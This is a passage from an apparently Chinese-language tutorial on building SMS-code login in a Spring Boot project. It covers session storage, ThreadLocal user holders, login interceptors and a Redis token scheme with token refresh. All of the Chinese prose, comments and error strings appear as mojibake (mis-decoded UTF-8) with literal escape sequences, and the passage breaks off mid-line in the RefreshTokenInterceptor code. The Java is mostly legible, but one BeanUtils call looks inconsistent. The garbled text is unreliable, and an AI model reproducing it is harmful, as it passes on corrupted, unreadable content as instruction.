ç™»å½•/æ³¨å†Œï¼š**\n\nç”¨æˆ·å°†éªŒè¯ç å’Œæ‰‹æœºå·è¿›è¡Œè¾“å…¥ï¼Œåå°ä»`session`ä¸­æ‹¿åˆ°å½“å‰éªŒè¯ç ï¼Œç„¶åå’Œç”¨æˆ·è¾“å…¥çš„éªŒè¯ç è¿›è¡Œæ ¡éªŒï¼Œ\n\n- å¦‚æœä¸ä¸€è‡´ï¼Œåˆ™æ— æ³•é€šè¿‡æ ¡éªŒï¼›\n- å¦‚æœä¸€è‡´ï¼Œåˆ™åå°æ ¹æ®æ‰‹æœºå·æŸ¥è¯¢ç”¨æˆ·ï¼›\n  - å¦‚æœç”¨æˆ·ä¸å­˜åœ¨ï¼Œåˆ™ä¸ºç”¨æˆ·åˆ›å»ºè´¦å·ä¿¡æ¯ï¼Œä¿å­˜åˆ°æ•°æ®åº“ï¼Œå¹¶ç”¨æˆ·ä¿¡æ¯ä¿å­˜åˆ°`session`ä¸­ï¼Œ\n  - å¦‚æœç”¨æˆ·å­˜åœ¨ï¼Œå°†ç”¨æˆ·ä¿¡æ¯ä¿å­˜åˆ°`session`ä¸­ï¼Œ\n  - æ— è®ºæ˜¯å¦å­˜åœ¨ï¼Œéƒ½å°†ç”¨æˆ·ä¿¡æ¯ä¿å­˜åˆ°`session`ä¸­æ˜¯ä¸ºäº†æ–¹ä¾¿åç»­è·å¾—å½“å‰ç™»å½•ä¿¡æ¯\n\n**3.æ ¡éªŒç™»å½•çŠ¶æ€:**\n\nç”¨æˆ·è¯·æ±‚æ—¶ï¼Œä¼šä»`cookie`ä¸­æºå¸¦`JsessionId`åˆ°åå°ï¼Œåå°é€šè¿‡`JsessionId`ä»`session`ä¸­æ‹¿åˆ°ç”¨æˆ·ä¿¡æ¯ï¼Œ\n\n- å¦‚æœæ²¡æœ‰`session`ä¿¡æ¯ï¼Œåˆ™è¿›è¡Œæ‹¦æˆªï¼Œ\n- å¦‚æœæœ‰`session`ä¿¡æ¯ï¼Œåˆ™å°†ç”¨æˆ·ä¿¡æ¯ä¿å­˜åˆ°`threadLocal`ä¸­ï¼Œå¹¶ä¸”æ”¾è¡Œ\n\n### 1.å‘é€éªŒè¯ç \n\n![é¡µé¢æµç¨‹](https://img.jwt1399.top/img/202210121713058.png)\n\n```java\npackage com.kbdp.service.impl;\n\n@Service\n@Slf4j\npublic class UserServiceImpl extends ServiceImpl<UserMapper, User> implements IUserService {\n\n    @Override\n    public Result sendCode(String phone, HttpSession session) {\n        // 1.æ ¡éªŒæ‰‹æœºå·\n        if (RegexUtils.isPhoneInvalid(phone)) {\n            // 2.å¦‚æœä¸ç¬¦åˆï¼Œè¿”å›é”™è¯¯ä¿¡æ¯\n            return Result.fail(\"æ‰‹æœºå·æ ¼å¼é”™è¯¯ï¼\");\n        }\n        // 3.ç¬¦åˆï¼Œç”ŸæˆéªŒè¯ç \n        String code = RandomUtil.randomNumbers(6);\n        // 4.ä¿å­˜éªŒè¯ç åˆ° session\n        session.setAttribute(\"code\",code);\n        // 5.å‘é€éªŒè¯ç \n        log.debug(\"å‘é€çŸ­ä¿¡éªŒè¯ç æˆåŠŸï¼ŒéªŒè¯ç ï¼š{}\", code);\n        // è¿”å›ok\n        return Result.ok();\n    }\n}\n```\n\n### 2.ç™»å½•/æ³¨å†Œ\n\n![é¡µé¢æµç¨‹](https://img.jwt1399.top/img/202210132211795.png)\n\n```java\npackage com.kbdp.service.impl;\n\n@Service\n@Slf4j\npublic class UserServiceImpl extends ServiceImpl<UserMapper, User> implements IUserService {\n\n  @Override\n  public Result login(LoginFormDTO loginForm, HttpSession session) {\n    // 1.æ ¡éªŒæ‰‹æœºå·\n    String phone = loginForm.getPhone();\n    if (RegexUtils.isPhoneInvalid(phone)) {\n      // 2.å¦‚æœä¸ç¬¦åˆï¼Œè¿”å›é”™è¯¯ä¿¡æ¯\n      return Result.fail(\"æ‰‹æœºå·æ ¼å¼é”™è¯¯ï¼\");\n    }\n    // 3.æ ¡éªŒéªŒè¯ç \n    Object cacheCode = session.getAttribute(\"code\");\n    String code = loginForm.getCode();\n    if (cacheCode == null || !cacheCode.toString().equals(code)) {\n      //4.ä¸ä¸€è‡´ï¼ŒæŠ¥é”™\n      return Result.fail(\"éªŒè¯ç é”™è¯¯\");\n    }\n    //5.ä¸€è‡´ï¼Œæ ¹æ®æ‰‹æœºå·æŸ¥è¯¢ç”¨æˆ·\n    //User user = query().eq(\"phone\", phone).one();\n    LambdaQueryWrapper<User> lqw = new LambdaQueryWrapper<>();\n    User user = getOne(lqw.eq(User::getPhone, phone));\n    //6.åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨\n    if(user == null){\n      //ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»º\n      user =  createUserWithPhone(phone);\n    }\n    //7.ä¿å­˜ç”¨æˆ·ä¿¡æ¯åˆ°sessionä¸­\n    session.setAttribute(\"user\",user);\n    return Result.ok();\n  }\n\n  private User createUserWithPhone(String phone) {\n    User user = new User();\n    user.setPhone(phone);\n    user.setNickName(USER_NICK_NAME_PREFIX + RandomUtil.randomNumbers(10));\n    save(user);\n    return user;\n  }\n  \n}\n```\n\n### 3.ç™»å½•éªŒè¯\n\n#### a.å‰ç½®çŸ¥è¯†\n\n- Tomcatçš„è¿è¡ŒåŸç†\n\n![](../images/Redis-å®æˆ˜ç¯‡/1653068196656.png)\n\nå½“ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼Œä¼šè®¿é—®æˆ‘ä»¬tomcatæ³¨å†Œçš„ç«¯å£ï¼Œä»»ä½•ç¨‹åºæƒ³è¦è¿è¡Œï¼Œéƒ½éœ€è¦æœ‰ä¸€ä¸ªçº¿ç¨‹å¯¹å½“å‰ç«¯å£å·è¿›è¡Œç›‘å¬ï¼Œtomcatä¹Ÿä¸ä¾‹å¤–ï¼Œå½“ç›‘å¬çº¿ç¨‹çŸ¥é“ç”¨æˆ·æƒ³è¦å’Œtomcatè¿æ¥æ—¶ï¼Œé‚£ä¼šç”±ç›‘å¬çº¿ç¨‹åˆ›å»ºsocketè¿æ¥ï¼Œsocketéƒ½æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œç”¨æˆ·é€šè¿‡socketäº’ç›¸ä¼ é€’æ•°æ®ï¼Œå½“tomcatç«¯çš„socketæ¥å—åˆ°æ•°æ®åï¼Œæ­¤æ—¶ç›‘å¬çº¿ç¨‹ä¼šä»tomcatçš„çº¿ç¨‹æ± ä¸­å–å‡ºä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œç”¨æˆ·è¯·æ±‚ï¼Œåœ¨æˆ‘ä»¬çš„æœåŠ¡éƒ¨ç½²åˆ°tomcatåï¼Œçº¿ç¨‹ä¼šæ‰¾åˆ°ç”¨æˆ·æƒ³è¦è®¿é—®çš„å·¥ç¨‹ï¼Œç„¶åç”¨è¿™ä¸ªçº¿ç¨‹è½¬å‘åˆ°å·¥ç¨‹ä¸­çš„controllerï¼Œserviceï¼Œdaoä¸­ï¼Œå¹¶ä¸”è®¿é—®å¯¹åº”çš„DBï¼Œåœ¨ç”¨æˆ·æ‰§è¡Œå®Œè¯·æ±‚åï¼Œå†ç»Ÿä¸€è¿”å›ï¼Œå†æ‰¾åˆ°tomcatç«¯çš„socketï¼Œå†å°†æ•°æ®å†™å›åˆ°ç”¨æˆ·ç«¯çš„socketï¼Œå®Œæˆè¯·æ±‚å’Œå“åº”\n\né€šè¿‡ä»¥ä¸Šè®²è§£ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥æ¯ä¸ªç”¨æˆ·å…¶å®å¯¹åº”éƒ½æ˜¯å»æ‰¾tomcatçº¿ç¨‹æ± ä¸­çš„ä¸€ä¸ªçº¿ç¨‹æ¥å®Œæˆå·¥ä½œçš„ï¼Œ ä½¿ç”¨å®Œæˆåå†è¿›è¡Œå›æ”¶ï¼Œæ—¢ç„¶æ¯ä¸ªè¯·æ±‚éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ‰€ä»¥åœ¨æ¯ä¸ªç”¨æˆ·å»è®¿é—®æˆ‘ä»¬çš„å·¥ç¨‹æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨threadlocalæ¥åšåˆ°çº¿ç¨‹éš”ç¦»ï¼Œæ¯ä¸ªçº¿ç¨‹æ“ä½œè‡ªå·±çš„ä¸€ä»½æ•°æ®\n\n- Threadlocal\n\n`ThreadLocal` å«åšæœ¬åœ°çº¿ç¨‹å˜é‡ï¼Œ`ThreadLocal` ä¸­å¡«å……çš„çš„æ˜¯å½“å‰çº¿ç¨‹çš„å˜é‡ï¼Œè¯¥å˜é‡å¯¹å…¶ä»–çº¿ç¨‹è€Œè¨€æ˜¯å°é—­ä¸”éš”ç¦»çš„\n\n#### b.å…·ä½“å®ç°\n\n\n\n![](https://img.jwt1399.top/img/202210261714702.png)\n\n- æ‹¦æˆªå™¨ä»£ç \n\n```java\npublic class LoginInterceptor implements HandlerInterceptor {\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n       //1.è·å–session\n        HttpSession session = request.getSession();\n        //2.è·å–sessionä¸­çš„ç”¨æˆ·\n        Object user = session.getAttribute(\"user\");\n        //3.åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨\n        if(user == null){\n              //4.ä¸å­˜åœ¨ï¼Œæ‹¦æˆªï¼Œè¿”å›401çŠ¶æ€ç \n              response.setStatus(401);\n              return false;\n        }\n        //5.å­˜åœ¨ï¼Œä¿å­˜ç”¨æˆ·ä¿¡æ¯åˆ°Threadlocal\n        UserHolder.saveUser((User)user);\n        //6.æ”¾è¡Œ\n        return true;\n    }\n}\n```\n\n- è®©æ‹¦æˆªå™¨ç”Ÿæ•ˆ\n\n```java\n@Configuration\npublic class MvcConfig implements WebMvcConfigurer {\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        // ç™»å½•æ‹¦æˆªå™¨\n        registry.addInterceptor(new LoginInterceptor())\n                .excludePathPatterns(\n                        \"/shop/**\",\n                        \"/voucher/**\",\n                        \"/shop-type/**\",\n                        \"/upload/**\",\n                        \"/blog/hot\",\n                        \"/user/code\",\n                        \"/user/login\"\n                );\n    }\n}\n```\n\n### 4.éšè—ç”¨æˆ·æ•æ„Ÿä¿¡æ¯\n\næˆ‘ä»¬é€šè¿‡æµè§ˆå™¨è§‚å¯Ÿåˆ°æ­¤æ—¶ç”¨æˆ·çš„å…¨éƒ¨ä¿¡æ¯éƒ½åœ¨ï¼Œè¿™æ ·æä¸ºä¸é è°±ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”å½“åœ¨è¿”å›ç”¨æˆ·ä¿¡æ¯ä¹‹å‰ï¼Œå°†ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯è¿›è¡Œéšè—ï¼Œé‡‡ç”¨çš„æ ¸å¿ƒæ€è·¯å°±æ˜¯ä¹¦å†™ä¸€ä¸ªUserDTOå¯¹è±¡ï¼Œè¿™ä¸ªUserDTOå¯¹è±¡å°±æ²¡æœ‰æ•æ„Ÿä¿¡æ¯äº†ï¼Œæˆ‘ä»¬åœ¨è¿”å›å‰ï¼Œå°†æœ‰ç”¨æˆ·æ•æ„Ÿä¿¡æ¯çš„Userå¯¹è±¡è½¬åŒ–æˆæ²¡æœ‰æ•æ„Ÿä¿¡æ¯çš„UserDTOå¯¹è±¡ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿé¿å…è¿™ä¸ªå°´å°¬çš„é—®é¢˜äº†\n\n```java\n@Data\npublic class UserDTO {\n    private Long id;\n    private String nickName;\n    private String icon;\n}\n```\n\n**åœ¨ç™»å½•æ–¹æ³•å¤„ä¿®æ”¹**\n\n```java\n//7.ä¿å­˜ç”¨æˆ·ä¿¡æ¯åˆ°sessionä¸­\nsession.setAttribute(\"user\", BeanUtils.copyProperties(user,UserDTO.class));\n```\n\n**åœ¨æ‹¦æˆªå™¨å¤„ï¼š**\n\n```java\n//5.å­˜åœ¨ï¼Œä¿å­˜ç”¨æˆ·ä¿¡æ¯åˆ°Threadlocal\nUserHolder.saveUser((UserDTO)user);\n```\n\n**åœ¨UserHolderå¤„ï¼šå°†userå¯¹è±¡æ¢æˆUserDTO**\n\n```java\npublic class UserHolder {\n    private static final ThreadLocal<UserDTO> tl = new ThreadLocal<>();\n\n    public static void saveUser(UserDTO user){\n        tl.set(user);\n    }\n\n    public static UserDTO getUser(){\n        return tl.get();\n    }\n\n    public static void removeUser(){\n        tl.remove();\n    }\n}\n```\n\n## â·é›†ç¾¤çš„sessionå…±äº«é—®é¢˜\n\n> **é›†ç¾¤çš„session å…±äº«é—®é¢˜**ï¼šå¤šå°Tomcatå¹¶ä¸å…±äº«sessionå­˜å‚¨ç©ºé—´ï¼Œå½“è¯·æ±‚åˆ‡æ¢åˆ°ä¸åŒtomcatæœåŠ¡æ—¶å¯¼è‡´æ•°æ®ä¸¢å¤±çš„é—®é¢˜ã€‚\n\n![](https://img.jwt1399.top/img/202210261713817.png)\n\næ¯ä¸ª tomcat ä¸­éƒ½æœ‰ä¸€ä»½å±äºè‡ªå·±çš„sessionï¼Œå‡è®¾ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ç¬¬ä¸€å°tomcatï¼Œå¹¶ä¸”æŠŠè‡ªå·±çš„ä¿¡æ¯å­˜æ”¾åˆ°ç¬¬ä¸€å°æœåŠ¡å™¨çš„sessionä¸­ï¼Œä½†æ˜¯ç¬¬äºŒæ¬¡è¿™ä¸ªç”¨æˆ·è®¿é—®åˆ°äº†ç¬¬äºŒå°tomcatï¼Œé‚£ä¹ˆåœ¨ç¬¬äºŒå°æœåŠ¡å™¨ä¸Šï¼Œè‚¯å®šæ²¡æœ‰ç¬¬ä¸€å°æœåŠ¡å™¨å­˜æ”¾çš„sessionï¼Œæ‰€ä»¥æ­¤æ—¶æ•´ä¸ªç™»å½•æ‹¦æˆªåŠŸèƒ½å°±ä¼šå‡ºç°é—®é¢˜ï¼Œæˆ‘ä»¬èƒ½å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ\n\næ—©æœŸçš„æ–¹æ¡ˆæ˜¯sessionæ‹·è´ï¼Œå°±æ˜¯è¯´è™½ç„¶æ¯ä¸ªtomcatä¸Šéƒ½æœ‰ä¸åŒçš„sessionï¼Œä½†æ˜¯æ¯å½“ä»»æ„ä¸€å°æœåŠ¡å™¨çš„sessionä¿®æ”¹æ—¶ï¼Œéƒ½ä¼šåŒæ­¥ç»™å…¶ä»–çš„TomcatæœåŠ¡å™¨çš„sessionï¼Œè¿™æ ·çš„è¯ï¼Œå°±å¯ä»¥å®ç°sessionçš„å…±äº«äº†\n\nä½†æ˜¯è¿™ç§æ–¹æ¡ˆå…·æœ‰ä¸¤ä¸ªå¤§é—®é¢˜\n\n- 1ã€æ¯å°æœåŠ¡å™¨ä¸­éƒ½æœ‰å®Œæ•´çš„ä¸€ä»½sessionæ•°æ®ï¼ŒæœåŠ¡å™¨å‹åŠ›è¿‡å¤§ã€‚\n\n- 2ã€sessionæ‹·è´æ•°æ®æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°å»¶è¿Ÿ\n\næ‰€ä»¥åæ¥é‡‡ç”¨çš„æ–¹æ¡ˆéƒ½æ˜¯åŸºäºredisæ¥å®Œæˆï¼Œæˆ‘ä»¬æŠŠsessionæ¢æˆredisï¼Œredisæ•°æ®æœ¬èº«å°±æ˜¯å…±äº«çš„ï¼Œå°±å¯ä»¥é¿å…sessionå…±äº«çš„é—®é¢˜äº†\n\n## â¸Redisä»£æ›¿sessionå®ç°ç™»å½•\n\n### 1.keyè®¾è®¡\n\n> åˆ©ç”¨redisæ¥å­˜å‚¨æ•°æ®ï¼Œé‚£ä¹ˆåˆ°åº•ä½¿ç”¨å“ªç§ç»“æ„å‘¢ï¼Ÿ\n\nç”±äºå­˜å…¥çš„æ•°æ®æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨Stringï¼Œæˆ–è€…æ˜¯ä½¿ç”¨Hash\n\n- ä½¿ç”¨Stringç»“æ„ï¼Œä»¥JSONå­—ç¬¦ä¸²æ¥ä¿å­˜ï¼Œæ¯”è¾ƒç›´è§‚ï¼Œå¤šå ç”¨ä¸€ç‚¹ç©ºé—´(è¿˜éœ€å­˜`{}ã€\"\"`ç­‰å­—ç¬¦)\n\n- ä½¿ç”¨Hashç»“æ„ï¼Œå¯ä»¥å°†å¯¹è±¡ä¸­çš„æ¯ä¸ªå­—æ®µç‹¬ç«‹å­˜å‚¨ï¼Œå¯ä»¥é’ˆå¯¹å•ä¸ªå­—æ®µåšCRUDï¼Œå¹¶ä¸”å†…å­˜å ç”¨æ›´å°‘\n\n|                        String                        |                         Hash                         |\n| :--------------------------------------------------: | :--------------------------------------------------: |\n| ![](https://img.jwt1399.top/img/202210261621745.png) | ![](https://img.jwt1399.top/img/202210261621354.png) |\n\nåœ¨è®¾è®¡è¿™ä¸ªkeyçš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹‹å‰è®²è¿‡éœ€è¦æ»¡è¶³ä¸¤ç‚¹\n\n1ã€keyè¦å…·æœ‰å”¯ä¸€æ€§\n\n2ã€keyè¦æ–¹ä¾¿æºå¸¦\n\nå¦‚æœæˆ‘ä»¬é‡‡ç”¨phoneï¼šæ‰‹æœºå·è¿™ä¸ªçš„æ•°æ®æ¥å­˜å‚¨å½“ç„¶æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯å¦‚æœæŠŠè¿™æ ·çš„æ•æ„Ÿæ•°æ®å­˜å‚¨åˆ°redisä¸­å¹¶ä¸”ä»é¡µé¢ä¸­å¸¦è¿‡æ¥æ¯•ç«Ÿä¸å¤ªåˆé€‚ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åå°ç”Ÿæˆä¸€ä¸ªéšæœºä¸²tokenï¼Œç„¶åè®©å‰ç«¯æºå¸¦è¿™ä¸ªtokenå°±èƒ½å®Œæˆæˆ‘ä»¬çš„æ•´ä½“é€»è¾‘äº†\n\n### 2.æ–°ç‰ˆç™»å½•æµç¨‹\n\n![](https://img.jwt1399.top/img/202210261713092.png)\n\nå½“æ³¨å†Œå®Œæˆåï¼Œç”¨æˆ·å»ç™»å½•ä¼šå»æ ¡éªŒç”¨æˆ·æäº¤çš„æ‰‹æœºå·å’ŒéªŒè¯ç ï¼Œæ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´ï¼Œåˆ™æ ¹æ®æ‰‹æœºå·æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œä¸å­˜åœ¨åˆ™æ–°å»ºï¼Œæœ€åå°†ç”¨æˆ·æ•°æ®ä¿å­˜åˆ°redisï¼Œå¹¶ä¸”ç”Ÿæˆtokenä½œä¸ºredisçš„keyï¼Œå½“æˆ‘ä»¬æ ¡éªŒç”¨æˆ·æ˜¯å¦ç™»å½•æ—¶ï¼Œä¼šå»æºå¸¦ç€tokenè¿›è¡Œè®¿é—®ï¼Œä»redisä¸­å–å‡ºtokenå¯¹åº”çš„valueï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ•°æ®ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ‹¦æˆªï¼Œå¦‚æœå­˜åœ¨åˆ™å°†å…¶ä¿å­˜åˆ°threadLocalä¸­ï¼Œå¹¶ä¸”æ”¾è¡Œã€‚\n\n### 3.å…·ä½“å®ç°\n\n**ç™»å½•/æ³¨å†Œä¸šåŠ¡ä»£ç **\n\n```java\n@Service\n@Slf4j\npublic class UserServiceImpl extends ServiceImpl<UserMapper, User> implements IUserService {\n\n    @Resource\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public Result sendCode(String phone, HttpSession session) {\n        // 1.æ ¡éªŒæ‰‹æœºå·\n        if (RegexUtils.isPhoneInvalid(phone)) {\n            // 2.å¦‚æœä¸ç¬¦åˆï¼Œè¿”å›é”™è¯¯ä¿¡æ¯\n            return Result.fail(\"æ‰‹æœºå·æ ¼å¼é”™è¯¯ï¼\");\n        }\n        // 3.ç¬¦åˆï¼Œç”ŸæˆéªŒè¯ç \n        String code = RandomUtil.randomNumbers(6);\n        // 4.ä¿å­˜éªŒè¯ç åˆ°redisï¼Œå¹¶è®¾ç½®è¿‡æœŸæ—¶é—´\n        stringRedisTemplate.opsForValue().set(LOGIN_CODE_KEY + phone, code, LOGIN_CODE_TTL, TimeUnit.MINUTES);\n        // 5.å‘é€éªŒè¯ç \n        log.debug(\"å‘é€çŸ­ä¿¡éªŒè¯ç æˆåŠŸï¼ŒéªŒè¯ç ï¼š{}\", code);\n        // 6.è¿”å›ok\n        return Result.ok();\n    }\n\n    @Override\n    public Result login(LoginFormDTO loginForm, HttpSession session) {\n        // 1.æ ¡éªŒæ‰‹æœºå·\n        String phone = loginForm.getPhone();\n        if (RegexUtils.isPhoneInvalid(phone)) {\n            // 2.å¦‚æœä¸ç¬¦åˆï¼Œè¿”å›é”™è¯¯ä¿¡æ¯\n            return Result.fail(\"æ‰‹æœºå·æ ¼å¼é”™è¯¯ï¼\");\n        }\n        // 3.ä»redisè·å–éªŒè¯ç å¹¶æ ¡éªŒ\n        String cacheCode = stringRedisTemplate.opsForValue().get(LOGIN_CODE_KEY + phone);\n        String code = loginForm.getCode();\n        if (cacheCode == null || !cacheCode.equals(code)) {\n            // 4.ä¸ä¸€è‡´ï¼ŒæŠ¥é”™\n            return Result.fail(\"éªŒè¯ç é”™è¯¯\");\n        }\n        // 5.ä¸€è‡´ï¼Œæ ¹æ®æ‰‹æœºå·æŸ¥è¯¢ç”¨æˆ· select * from tb_user where phone = ?\n        //User user = query().eq(\"phone\", phone).one();\n        LambdaQueryWrapper<User> lqw = new LambdaQueryWrapper<>();\n        User user = getOne(lqw.eq(User::getPhone, phone));\n        // 6.åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨\n        if (user == null) {\n            //ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»º\n            user = createUserWithPhone(phone);\n        }\n        // 7.ä¿å­˜ç”¨æˆ·ä¿¡æ¯åˆ°redisä¸­\n        // 7.1.éšæœºç”Ÿæˆtokenï¼Œä½œä¸ºç™»å½•ä»¤ç‰Œ\n        String token = UUID.randomUUID().toString(true);\n        // 7.2.å°†Userå¯¹è±¡è½¬ä¸ºHashMapå­˜å‚¨\n        UserDTO userDTO = BeanUtil.copyProperties(user, UserDTO.class);\n        Map<String, Object> userMap = BeanUtil.beanToMap(userDTO, new HashMap<>(),\n                CopyOptions.create()\n                        .setIgnoreNullValue(true)\n                        .setFieldValueEditor((fieldName, fieldValue) -> fieldValue.toString()));\n        // 7.3.å­˜å‚¨ç”¨æˆ·ä¿¡æ¯\n        String tokenKey = LOGIN_USER_KEY + token;\n        stringRedisTemplate.opsForHash().putAll(tokenKey, userMap);\n        // 7.4.è®¾ç½®tokenæœ‰æ•ˆæœŸ\n        stringRedisTemplate.expire(tokenKey, LOGIN_USER_TTL, TimeUnit.MINUTES);\n        // 8.è¿”å›token\n        return Result.ok(token);\n    }\n\n    private User createUserWithPhone(String phone) {\n        User user = new User();\n        user.setPhone(phone);\n        user.setNickName(USER_NICK_NAME_PREFIX + RandomUtil.randomNumbers(10));\n        save(user);\n        return user;\n    }\n}\n```\n\n**æ ¡éªŒç™»å½•ï¼Œç›‘å¬å™¨ä»£ç **\n\n```java\npackage com.kbdp.utils;\n\npublic class LoginInterceptor implements HandlerInterceptor {\n\n    //æ„é€ å™¨æ³¨å…¥ï¼ˆLoginInterceptorä¸æ˜¯ç”±Springåˆ›å»ºçš„ï¼‰\n    private StringRedisTemplate stringRedisTemplate;\n    public LoginInterceptor(StringRedisTemplate stringRedisTemplate) {\n        this.stringRedisTemplate = stringRedisTemplate;\n    }\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        // 1.è·å–è¯·æ±‚å¤´ä¸­çš„token\n        String token = request.getHeader(\"authorization\");\n        if (StrUtil.isBlank(token)){\n            //ä¸å­˜åœ¨ï¼Œæ‹¦æˆªï¼Œè¿”å›401çŠ¶æ€ç \n            response.setStatus(401);\n            return false;\n        }\n        // 2.åŸºäºTOKENè·å–redisä¸­çš„ç”¨æˆ·\n        String key  = LOGIN_USER_KEY + token;\n        Map<Object, Object> userMap = stringRedisTemplate.opsForHash().entries(key);\n        // 3.åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨\n        if(userMap.isEmpty()){\n            // 4.ä¸å­˜åœ¨ï¼Œæ‹¦æˆªï¼Œè¿”å›401çŠ¶æ€ç \n            response.setStatus(401);\n            return false;\n        }\n        // 5.å°†æŸ¥è¯¢åˆ°çš„hashæ•°æ®è½¬ä¸ºUserDTO\n        UserDTO userDTO = BeanUtil.fillBeanWithMap(userMap, new UserDTO(), false);\n        //6.å­˜åœ¨ï¼Œä¿å­˜ç”¨æˆ·ä¿¡æ¯åˆ°Threadlocal\n        UserHolder.saveUser(userDTO);\n        // 7.åˆ·æ–°tokenæœ‰æ•ˆæœŸ\n        stringRedisTemplate.expire(key, LOGIN_USER_TTL, TimeUnit.MINUTES);\n        // 8.æ”¾è¡Œ\n        return true;\n    }\n}\n```\n\n```java\npackage com.kbdp.config;\n\n@Configuration\npublic class MvcConfig implements WebMvcConfigurer {\n\n    //æ³¨å…¥StringRedisTemplate\n    @Resource\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        // ç™»å½•æ‹¦æˆªå™¨\n        registry.addInterceptor(new LoginInterceptor(stringRedisTemplate))\n                .excludePathPatterns(\n                        \"/shop/**\",\n                        \"/voucher/**\",\n                        \"/shop-type/**\",\n                        \"/upload/**\",\n                        \"/blog/hot\",\n                        \"/user/code\",\n                        \"/user/login\"\n                );\n    }\n}\n```\n\n### 4.è§£å†³tokenåˆ·æ–°é—®é¢˜\n\n> å³ç”¨æˆ·åªè¦ä¸€ç›´è®¿é—®é¡µé¢ï¼Œé‚£ä¹ˆå°±åˆ·æ–°tokenï¼Œæ—¢å¯ä»¥ä¸€ç›´ä¿æŒç™»å½•çŠ¶æ€\n\n**åˆå§‹æ–¹æ¡ˆï¼š**\n\nåˆå§‹æ–¹æ¡ˆä¸­ï¼Œç¡®å®å¯ä»¥ä½¿ç”¨å¯¹åº”è·¯å¾„çš„æ‹¦æˆªï¼ŒåŒæ—¶åˆ·æ–°ç™»å½•tokenä»¤ç‰Œçš„å­˜æ´»æ—¶é—´ï¼Œä½†æ˜¯ç°åœ¨è¿™ä¸ªæ‹¦æˆªå™¨åªæ˜¯æ‹¦æˆªéœ€è¦è¢«æ‹¦æˆªçš„è·¯å¾„ï¼ˆç™»å½•æ‰èƒ½è®¿é—®çš„é¡µé¢ï¼‰ï¼Œå‡è®¾å½“å‰ç”¨æˆ·è®¿é—®äº†ä¸€äº›ä¸éœ€è¦æ‹¦æˆªçš„è·¯å¾„ï¼Œé‚£ä¹ˆè¿™ä¸ªæ‹¦æˆªå™¨å°±ä¸ä¼šç”Ÿæ•ˆï¼Œæ‰€ä»¥æ­¤æ—¶tokenä»¤ç‰Œåˆ·æ–°çš„åŠ¨ä½œå°±ä¸ä¼šæ‰§è¡Œï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ¡ˆæ˜¯å­˜åœ¨é—®é¢˜çš„\n\n![](https://img.jwt1399.top/img/202210271640418.png)\n\n**ä¼˜åŒ–æ–¹æ¡ˆ**\n\nä¹‹å‰çš„æ‹¦æˆªå™¨æ— æ³•å¯¹ä¸éœ€è¦æ‹¦æˆªçš„è·¯å¾„ç”Ÿæ•ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œåœ¨ç¬¬ä¸€ä¸ªæ‹¦æˆªå™¨ä¸­æ‹¦æˆªæ‰€æœ‰çš„è·¯å¾„ï¼ŒæŠŠç¬¬äºŒä¸ªæ‹¦æˆªå™¨åšçš„äº‹æƒ…æ”¾å…¥åˆ°ç¬¬ä¸€ä¸ªæ‹¦æˆªå™¨ä¸­ï¼ŒåŒæ—¶åˆ·æ–°tokenä»¤ç‰Œï¼Œå› ä¸ºç¬¬ä¸€ä¸ªæ‹¦æˆªå™¨æœ‰äº†threadLocalçš„æ•°æ®ï¼Œæ‰€ä»¥æ­¤æ—¶ç¬¬äºŒä¸ªæ‹¦æˆªå™¨åªéœ€è¦åˆ¤æ–­æ‹¦æˆªå™¨ä¸­çš„userå¯¹è±¡æ˜¯å¦å­˜åœ¨å³å¯ï¼Œå®Œæˆæ•´ä½“åˆ·æ–°åŠŸèƒ½ã€‚\n\n![](https://img.jwt1399.top/img/202210271640150.png)\n\n\n\n**RefreshTokenInterceptor**\n\n```java\npublic class RefreshTokenInterceptor implements HandlerInterceptor {\n\n    private StringRedisTemplate stringRedisTemplate;\n\n    public RefreshTokenInterceptor(StringRedisTemplate stringRedisTemplate) {\n        this.stringRedisTemplate = stringRedisTemplate;\n    }\n\n\t\t@Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        // 1.è·å–è¯·æ±‚å¤´ä¸­çš„token\n        String token = request.getHeader(\"authorization\");\n        if (StrUtil.isBlank(token)){\n            return true;\n        }\n\n        // 2.åŸºäºTOKENè·å–redisä¸­çš„ç”¨æˆ·\n        String key  = LOGIN_USER_KEY + token;\n        Map<Object, Object> userMap = 